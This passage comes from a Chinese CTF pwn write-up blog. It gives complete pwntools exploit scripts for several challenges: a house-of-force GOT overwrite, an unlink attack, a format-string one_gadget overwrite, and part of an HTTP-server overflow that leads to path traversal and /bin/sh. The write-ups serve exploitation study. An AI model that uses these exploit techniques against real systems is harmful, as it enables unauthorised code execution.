class="hljs-number">0</span>) + p64(close_addr)<br><span class="hljs-attribute">orw</span> += p64(pop_rdi) + p64(heap_base + <span class="hljs-number">0</span>x1bf0) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall_ret)<br><span class="hljs-attribute">orw</span> += p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) +p64(heap_base + <span class="hljs-number">0</span>x200) + p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>x30)*<span class="hljs-number">2</span>+ p64(read_addr)<br><span class="hljs-attribute">orw</span> += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_base + <span class="hljs-number">0</span>x200) + p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>x30)*<span class="hljs-number">2</span>+ p64(write_addr)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">10</span>, <span class="hljs-number">0</span>x458, orw)<br><br><span class="hljs-attribute">debug</span>()<br><br><span class="hljs-attribute">delete</span>(<span class="hljs-number">9</span>)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">11</span>, <span class="hljs-number">0</span>x458, <span class="hljs-string">&quot;hole_10&quot;</span>)<br><span class="hljs-attribute">mini</span>(<span class="hljs-number">9</span>, fake_head)<br><span class="hljs-attribute">delete</span>(<span class="hljs-number">7</span>)<br><span class="hljs-attribute">choice</span>(b<span class="hljs-string">&quot;CAT&quot;</span>, b&#x27;\xff\xff\xff\xff&#x27; + b<span class="hljs-string">&quot;$&quot;</span>)<br><span class="hljs-attribute">sla</span>(<span class="hljs-string">&quot;choice:\n&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-attribute">sla</span>(<span class="hljs-string">&quot;idx:\n&quot;</span>, str(<span class="hljs-number">12</span>))<br><span class="hljs-attribute">sla</span>(<span class="hljs-string">&quot;size:\n&quot;</span>, str(<span class="hljs-number">0</span>x458))<br><span class="hljs-attribute">flag_txt</span> = ru(<span class="hljs-string">&quot;&#125;&quot;</span>)<br><span class="hljs-attribute">print</span>(flag_txt)<br><span class="hljs-attribute">io</span>.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="easy-force"><a href="#easy-force" class="headerlink" title="easy_force"></a>easy_force</h1><p>題目環境爲2.23 11.3，只有add功能，題目存在堆溢出，通過題目名字提示我們也可以知道用到了house of force的手法，至於其中的libc泄露我們只需要使用memmap來分配即可，因爲他的add函數裏面貼心的給我們提供了一個打印地址的功能，之後我們利用force修改got表即可，exit或者malloc應該都可可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>from ctypes import *<br>context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)<br>context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]<br><br><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcl = lambda : io.recvline()<br><br>def slog(name, address): print(&quot;\033[40;34m[+]\033[40;35m&quot; + name + &quot;==&gt;&quot; +hex(address) + &quot;\033[0m&quot;)<br><br>def debug(cmd = 0):<br>    if cmd == 0:<br>        gdb.attach(io)<br>    else:<br>        gdb.attach(io, cmd)<br>    <br>def get_address(mode = 0): <br>    if mode == 0:<br>        return u64(ru(&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>    elif mode == 1:<br>        return u64(rc(6).ljust(8, b&#x27;\x00&#x27;))<br>    elif mode == 2:<br>        return int(rc(12), 16)<br>    elif mode == 3:<br>        return int(rc(16), 16)<br>    else :<br>        return 0<br><br>def add(index, size, content):<br>    sla(&quot;away\n&quot;, &quot;1&quot;)<br>    sla(&quot;index?\n&quot;, str(index))<br>    sla(&quot;want?\n&quot;, str(size))<br>    sa(&quot;write?\n&quot;, content)<br><br><br>io = process(&quot;./pwn&quot;)<br>io = remote(&quot;node4.anna.nssctf.cn&quot;, 28514)<br>add(3, 0x888888, &#x27;aaa&#x27;);<br>ru(&quot;0x&quot;)<br>libc_base = int(ru(&quot; &quot;)[:-1], 16) + 0x888ff0<br>slog(&quot;libc_base&quot;, libc_base)<br>add(0, 0x8, b&#x27;a&#x27;*0x18 + p64(0xffffffffffffffff))<br>ru(&quot;0x&quot;)<br>top_base = int(ru(&quot; &quot;)[:-1], 16) + 0x10<br>slog(&quot;top_base&quot;, top_base)<br>exit_got = 0x602058<br>chunk_list = 0x6020a0<br>stdin = 0x602090<br>malloc_got = 0x602040<br>one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]<br>shell = libc_base + one_gadget[3]<br>add(1, -(top_base - malloc_got + 0x20), &#x27;peiwit&#x27;)<br>add(2, 0x20, p64(shell))<br><br>#debug(&quot;b *0x4008c6&quot;)<br>sla(&quot;away\n&quot;, &quot;1&quot;)<br>sla(&quot;index?\n&quot;, &#x27;4&#x27;)<br>sla(&quot;want?\n&quot;, &#x27;16&#x27;)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="Printf-but-not-fmtstr"><a href="#Printf-but-not-fmtstr" class="headerlink" title="Printf but not fmtstr"></a>Printf but not fmtstr</h1><p>題目版本爲2.36 沒開pie，漏洞點爲UAF，很傳統的unlink，exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>from ctypes import *<br>context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)<br>context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]<br><br><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcl = lambda : io.recvline()<br><br>def slog(name, address): print(&quot;\033[40;34m[+]\033[40;35m&quot; + name + &quot;==&gt;&quot; +hex(address) + &quot;\033[0m&quot;)<br><br>def debug(cmd = 0):<br>    if cmd == 0:<br>        gdb.attach(io)<br>    else:<br>        gdb.attach(io, cmd)<br>    <br>def get_address(mode = 0): <br>    if mode == 0:<br>        return u64(ru(&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>    elif mode == 1:<br>        return u64(rc(6).ljust(8, b&#x27;\x00&#x27;))<br>    elif mode == 2:<br>        return int(rc(12), 16)<br>    elif mode == 3:<br>        return int(rc(16), 16)<br>    else :<br>        return 0<br><br>def add(index, size):<br>    sla(&quot;&gt;&quot;, &quot;1&quot;)<br>    sla(&quot;Index: &quot;, str(index))<br>    sla(&quot;Size: &quot;, str(size))<br><br>def delete(index):<br>    sla(&quot;&gt;&quot;, &quot;2&quot;)<br>    sla(&quot;Index: &quot;, str(index))<br> <br>def edit(index, content):<br>    sla(&quot;&gt;&quot;, &quot;3&quot;)<br>    sla(&quot;Index: &quot;, str(index))<br>    sa(&quot;Content&quot;, content)<br><br>def show(index):<br>    sla(&quot;&gt;&quot;, &quot;4&quot;)<br>    sla(&quot;Index: &quot;, str(index))<br><br>io = process(&quot;./pwn&quot;)<br>io = remote(&quot;node4.anna.nssctf.cn&quot;, 28068)<br>chunk_list = 0x4040e0<br><br># leak the heap libc addr<br>add(0, 0x508)<br><br>add(1, 0x558)<br>add(2, 0x608)<br>delete(1)<br>show(1)<br>libc_base = get_address() - 0x1f6cc0<br>slog(&quot;libc_base&quot;, libc_base)<br>add(3, 0x608)<br>edit(1, &#x27;a&#x27;*0xf + &#x27;c&#x27;)<br>show(1)<br>ru(&quot;ac&quot;)<br>heap_base = u64(ru(&quot;\x0a&quot;)[:-1].ljust(8, b&#x27;\x00&#x27;)) - 0x7a0<br>slog(&quot;heap_base&quot;, heap_base)<br>edit(1, p64(libc_base + 0x1f7100)*2)<br><br><br># unlink<br>add(4, 0x558)<br>delete(0)<br>add(6, 0x608)<br>edit(0, p64(0) + p64(0x501) + p64(chunk_list - 0x18) + p64(chunk_list - 0x10) + b&#x27;\x00&#x27;*0x4e0 + p64(0x500))<br>delete(4)<br><br>#change the free_got<br>libc = ELF(&quot;./libc.so.6&quot;)<br>elf = ELF(&quot;./pwn&quot;)<br>free_got = elf.got[&#x27;free&#x27;]<br>system = elf.sym[&#x27;system&#x27;]<br>edit(0, p64(8)*3 + p64(0x4040c8) + p64(free_got))<br>edit(1, p64(system))<br><br>edit(2, &quot;/bin/sh\x00&quot;)<br>delete(2)<br><br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTFwp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HWSand工控复现</title>
    <link href="/2023/07/24/HWSand%E5%B7%A5%E6%8E%A7%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/07/24/HWSand%E5%B7%A5%E6%8E%A7%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="HWS线上赛赛题复现"><a href="#HWS线上赛赛题复现" class="headerlink" title="HWS线上赛赛题复现"></a>HWS线上赛赛题复现</h1><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>首先是个格式化字符串简单题</p><p>题目保护全开，libc给了2.31但是是栈题</p><p>题目给出了两次格式化字符串的机会，第一次我们可以泄露canary、libc_base、stack_addr、pro_base</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">run</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> s1[<span class="hljs-number">88</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-60h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+58h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I need a str: &quot;</span>);<br>  read_n((__int64)s1, <span class="hljs-number">80</span>);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;EXIT&quot;</span>) )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">printf</span>(s1);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I need other str: &quot;</span>);<br>  read_n((__int64)s1, <span class="hljs-number">80</span>);<br>  <span class="hljs-built_in">printf</span>(s1);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是其中我们只需要泄露libc和stack_addr即可</p><p>泄露地址后修改main-&gt;__libc_start_main返回地址即可，我们可以通过gdb调试指令bt得知存放在栈上的一个返回值，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; bt                                                                                                 <br><span class="hljs-comment">#0  __printf (format=0x7fff0c211e90 &quot;%1c%14$hhn%43210c%15$hn&quot;, &#x27;a&#x27; &lt;repeats 41 times&gt;, &quot;\b\037!\f\377\177&quot;)</span><br> at printf.c:28                                                                                            <br><span class="hljs-comment">#1  0x0000559d1b7083af in run ()                                                                           </span><br><span class="hljs-comment">#2  0x0000559d1b7083e2 in main ()    </span><br>//下面这排<br><span class="hljs-comment">#3  0x00007faf319cd083 in __libc_start_main (main=0x559d1b7083c6 &lt;main&gt;, argc=1, argv=0x7fff0c211ff8, init=</span><br>&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fff0c211fe8) at ../csu/libc-<br>start.c:308                                                                                             <br><span class="hljs-comment">#4  0x0000559d1b70816e in _start ()                                                                        </span><br><br></code></pre></td></tr></table></figure><p>下面是整体步骤：</p><ol><li>泄露libc，stack_addr</li><li>找到__libc_start_main在栈上的返回地址存放点，我们利用格式化字符串修改其为onegadget即可</li></ol><p>exp如下：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br>from LibcSearcher import *<br>from ctypes import *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>s   = lambda content : io.send(content)<br><span class="hljs-keyword">sl</span>  = lambda content : io.sendline(content)<br><span class="hljs-keyword">sa</span>  = lambda content,send : io.sendafter(content, send)<br><span class="hljs-keyword">sla</span> = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda <span class="hljs-keyword">number</span> : io.recv(<span class="hljs-keyword">number</span>)<br><span class="hljs-keyword">ru</span>  = lambda content : io.recvuntil(content)<br><br>def slog(name, address): <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;\033[40;34m[+]\033[40;35m&quot;</span> + name + <span class="hljs-string">&quot;==&gt;&quot;</span> +hex(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br>def <span class="hljs-keyword">debug</span>(): <br>   gdb.attach(io)<br>    <br>def get_address(): <span class="hljs-keyword">return</span> u64(<span class="hljs-keyword">ru</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&quot;need a str: &quot;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;%17$p.%10$p.%13$p.%18$p&#x27;</span>)<br><br><span class="hljs-keyword">ru</span>(<span class="hljs-string">&quot;0x&quot;</span>)<br>canary = <span class="hljs-keyword">int</span>(rc(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">&quot;0x&quot;</span>)<br>libc_base = <span class="hljs-keyword">int</span>(rc(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x1ed5c0<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">&quot;0x&quot;</span>)<br>pro_base = <span class="hljs-keyword">int</span>(rc(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x13f0<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">&quot;0x&quot;</span>)<br><span class="hljs-keyword">ret</span> = <span class="hljs-keyword">int</span>(rc(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) + <span class="hljs-number">0</span>x8<br>slog(<span class="hljs-string">&quot;canary&quot;</span>, canary)<br>slog(<span class="hljs-string">&quot;libc_base&quot;</span>, libc_base)<br>slog(<span class="hljs-string">&quot;pro_base&quot;</span>, pro_base)<br>slog(<span class="hljs-string">&quot;return&quot;</span>, <span class="hljs-keyword">ret</span>)<br>one_gadget = [<span class="hljs-number">0</span>xe3afe, <span class="hljs-number">0</span>xe3b01, <span class="hljs-number">0</span>xe3b04]<br><span class="hljs-keyword">shell</span> = one_gadget[<span class="hljs-number">1</span>] + libc_base<br>slog(<span class="hljs-string">&quot;one_gadget&quot;</span>, <span class="hljs-keyword">shell</span>)<br><br>low_one = <span class="hljs-keyword">shell</span> % <span class="hljs-number">0</span>x100<br>higth_two = <span class="hljs-keyword">int</span>(<span class="hljs-keyword">shell</span>/<span class="hljs-number">0</span>x100)%<span class="hljs-number">0</span>x10000<br>payload = <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;%&#x27;</span> + str(low_one).encode() + <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;c%14$hhn%&#x27;</span> + str(higth_two - low_one).encode() + <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;c%15$hn&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0</span>x40, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>)<br>payload += p64(<span class="hljs-keyword">ret</span>) + p64(<span class="hljs-keyword">ret</span> + <span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">debug</span>()<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&quot;other str: &quot;</span>, payload)<br>slog(<span class="hljs-string">&quot;shell&quot;</span>, <span class="hljs-keyword">shell</span>)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="ezhttpd"><a href="#ezhttpd" class="headerlink" title="ezhttpd"></a>ezhttpd</h2><p>一个简单的服务器实现，可以发送套接字，该程序改自github上的一个项目<code>TinyHttpd</code>，可以参考一下github上的源码来逆</p><p>他的大致功能就是，首先你传递一个套接字，里面包含了头部类型信息、url等，他会对其中的字段进行验证</p><p>题目的漏洞点在于base64解密的部分，如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span> ( !strcasecmp(<span class="hljs-keyword">method</span>, <span class="hljs-string">&quot;GET&quot;</span>) )<br>&#123;<br>  <span class="hljs-keyword">while</span> ( numchar<span class="hljs-operator"> &amp;&amp; </span>strcmp(<span class="hljs-string">&quot;\n&quot;</span>, buff) )<br>  &#123;<br>    numchar = get<span class="hljs-constructor">_line(<span class="hljs-params">socket</span>, <span class="hljs-params">buff</span>, 1024)</span>;<br>    <span class="hljs-keyword">if</span> ( !strncasecmp(buff, <span class="hljs-string">&quot;Authorization: Basic &quot;</span>, <span class="hljs-number">0x15</span>uLL) )<br>    &#123;<br>      base64<span class="hljs-constructor">_decode(<span class="hljs-params">v18</span>, <span class="hljs-params">v12</span>)</span>;<br>      <span class="hljs-keyword">if</span> ( !sub<span class="hljs-constructor">_19B7(<span class="hljs-params">v12</span>)</span> )<br>        v2 = <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>这里的v18实际上就是buff丢掉前面<code>Authorization: Basic</code>十五个字节后的部分，不得不说ida这里编译的确实离谱，然后我们可以看到v12他在我们之前栈上存放的url的上方</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs css">int v2; // <span class="hljs-selector-attr">[rsp+18h]</span> <span class="hljs-selector-attr">[rbp-918h]</span><br>int v3; // <span class="hljs-selector-attr">[rsp+1Ch]</span> <span class="hljs-selector-attr">[rbp-914h]</span><br>unsigned int v4; // <span class="hljs-selector-attr">[rsp+20h]</span> <span class="hljs-selector-attr">[rbp-910h]</span><br>unsigned __int64 numchar; // <span class="hljs-selector-attr">[rsp+28h]</span> <span class="hljs-selector-attr">[rbp-908h]</span><br>__int64 j; // <span class="hljs-selector-attr">[rsp+28h]</span> <span class="hljs-selector-attr">[rbp-908h]</span><br>unsigned __int64 <span class="hljs-selector-tag">i</span>; // <span class="hljs-selector-attr">[rsp+30h]</span> <span class="hljs-selector-attr">[rbp-900h]</span><br>unsigned __int64 v8; // <span class="hljs-selector-attr">[rsp+30h]</span> <span class="hljs-selector-attr">[rbp-900h]</span><br>unsigned __int64 m; // <span class="hljs-selector-attr">[rsp+38h]</span> <span class="hljs-selector-attr">[rbp-8F8h]</span><br>char *k; // <span class="hljs-selector-attr">[rsp+40h]</span> <span class="hljs-selector-attr">[rbp-8F0h]</span><br>struct stat stat_buf; // <span class="hljs-selector-attr">[rsp+50h]</span> <span class="hljs-selector-attr">[rbp-8E0h]</span> BYREF<br>char v12<span class="hljs-selector-attr">[64]</span>; // <span class="hljs-selector-attr">[rsp+E0h]</span> <span class="hljs-selector-attr">[rbp-850h]</span> BYREF //这里<br>char url<span class="hljs-selector-attr">[256]</span>; // <span class="hljs-selector-attr">[rsp+120h]</span> <span class="hljs-selector-attr">[rbp-810h]</span> BYREF<br>char method<span class="hljs-selector-attr">[256]</span>; // <span class="hljs-selector-attr">[rsp+220h]</span> <span class="hljs-selector-attr">[rbp-710h]</span> BYREF<br>char s<span class="hljs-selector-attr">[512]</span>; // <span class="hljs-selector-attr">[rsp+320h]</span> <span class="hljs-selector-attr">[rbp-610h]</span> BYREF<br>char buff<span class="hljs-selector-attr">[16]</span>; // <span class="hljs-selector-attr">[rsp+520h]</span> <span class="hljs-selector-attr">[rbp-410h]</span> BYREF<br>char v17<span class="hljs-selector-attr">[5]</span>; // <span class="hljs-selector-attr">[rsp+530h]</span> <span class="hljs-selector-attr">[rbp-400h]</span> BYREF<br>_BYTE v18<span class="hljs-selector-attr">[1011]</span>; // <span class="hljs-selector-attr">[rsp+535h]</span> <span class="hljs-selector-attr">[rbp-3FBh]</span> BYREF<br>unsigned __int64 v19; // <span class="hljs-selector-attr">[rsp+928h]</span> <span class="hljs-selector-attr">[rbp-8h]</span><br></code></pre></td></tr></table></figure><p>而其中我们没有判断v18的大小，所以说这里我们可以通过溢出到url来使得绕过之前url的<code>..</code>限制,</p><p>后面就是来检测咱们的url，他需要满足存在后缀名<code>.css</code>或<code>.html</code>等等，所以我们需要在溢出的url中满足该需求</p><p>然后到后面我们会有个?的判断，这里会使得url中从?开始截断</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">if</span> ( !strcasecmp(<span class="hljs-keyword">method</span>, &quot;<span class="hljs-title function_">GET</span>&quot;) )<br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">  for ( k = url; *k != &#x27;?&#x27; &amp;&amp; *k; ++k )</span><br><span class="hljs-comment">    ;</span><br><span class="hljs-comment">  if ( *k == &#x27;?&#x27; )</span><br><span class="hljs-comment">  &#123;</span><br><span class="hljs-comment">    v3 = 1;</span><br><span class="hljs-comment">    *k++ = 0;</span><br><span class="hljs-comment">  &#125;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们到后面会存在<code>sub_2993</code>这个函数，里面调用了这样一个函数<code>execl(url, 0)</code>,该函数属于exec函数簇，大致含义可以说调用新进程，所以我们可以在url中传入<code>/bin/sh</code>即可实现getshell，但是在此之前它会往我们的url头部添加一个<code>htdocs/</code>目录，所以我们使用..绕过即可</p><p>综上，我们传入的包头应该包含以下内容：</p><ol><li>后缀名.html</li><li>..&#x2F;bin&#x2F;sh</li><li>使用?来截断url的后缀名</li></ol><p>以下是exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 